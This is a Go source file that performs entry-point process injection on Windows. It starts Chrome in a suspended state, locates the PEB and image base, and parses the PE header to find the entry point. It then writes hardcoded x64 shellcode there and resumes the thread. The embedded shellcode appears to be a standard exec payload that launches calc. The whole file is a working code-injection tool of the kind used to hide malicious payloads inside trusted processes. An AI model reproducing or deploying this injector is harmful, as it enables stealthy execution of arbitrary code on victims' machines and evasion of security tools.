package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

func main() {
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300")

	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	path := "C:\\Program Files\\Google\\Chrome\\Application\\Chrome.exe"

	err := windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfo,
		&outProcInfo)

	if err != nil {
		log.Fatalf("[FATAL] Failed to Create Process: %v", err)
	}

	fmt.Printf("[+] Process Created from path: %s with PID: %d\n", path, outProcInfo.ProcessId)
	fmt.Printf("[+] Process Handle: %x \n[+] Thread Handle: %x\n", outProcInfo.Process, outProcInfo.Thread)

	var ProcessInformation PROCESS_BASIC_INFORMATION
	ProcessInformationLength := uint32(unsafe.Sizeof(uintptr(0)))
	var ReturnLength uint32

	err = windows.NtQueryInformationProcess(outProcInfo.Process, 0, unsafe.Pointer(&ProcessInformation), ProcessInformationLength*6, &ReturnLength)
	if err != nil {
		log.Fatalf("[FATAL] Failed to Query Information Process: %v", err)
	}

	imageBaseAddress := uint64(ProcessInformation.PebAddress + 0x10)
	fmt.Printf("[+] Address Holding image base address: 0x%x\n", imageBaseAddress)

	lpBuffer := make([]byte, unsafe.Sizeof(uintptr(0)))
	var lpNumberOfBytesRead uintptr

	err = windows.ReadProcessMemory(outProcInfo.Process, uintptr(imageBaseAddress), &lpBuffer[0], uintptr(len(lpBuffer)), &lpNumberOfBytesRead)
	if err != nil {
		log.Fatalf("[FATAL] Failed to ReadProcessMemory -- imageBaseAddress: %v", err)
	}
	fmt.Printf("[+] Number of bytes read: %d\n", lpNumberOfBytesRead)

	lpBaseAddress := binary.LittleEndian.Uint64(lpBuffer)
	fmt.Printf("[+] Image base: 0x%x\n", lpBaseAddress)

	lpBuffer = make([]byte, 0x200)

	err = windows.ReadProcessMemory(outProcInfo.Process, uintptr(lpBaseAddress), &lpBuffer[0], uintptr(len(lpBuffer)), &lpNumberOfBytesRead)
	if err != nil {
		log.Fatalf("[FATAL] Failed to ReadProcessMemory -- lpBaseAddress: %v", err)
	}
	lfaNewPos := lpBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)

	fmt.Printf("[+] PE Signature Offset: 0x%x\n", lfanew)

	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := lpBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	fmt.Printf("[+] Entry Point Offset: 0x%x\n", entrypointRVA)
	entrypointAddress := lpBaseAddress + uint64(entrypointRVA)
	fmt.Printf("[+] Entry Point Address Identified 0x%x\n", entrypointAddress)

	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(outProcInfo.Process, uintptr(entrypointAddress), &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[FATAL] Failed to WriteProcessMemory: %v", err)
	}

	fmt.Printf("[+] Wrote %d/%d shellcode bytes to destination address\n", numberOfBytesWritten, len(sc))

	_, err = windows.ResumeThread(windows.Handle(outProcInfo.Thread))
	if err != nil {
		log.Fatalf("[FATAL] Can't resume thread. %v\n", err)
	}
	fmt.Println("[+] Resuming Suspended Thread")

}
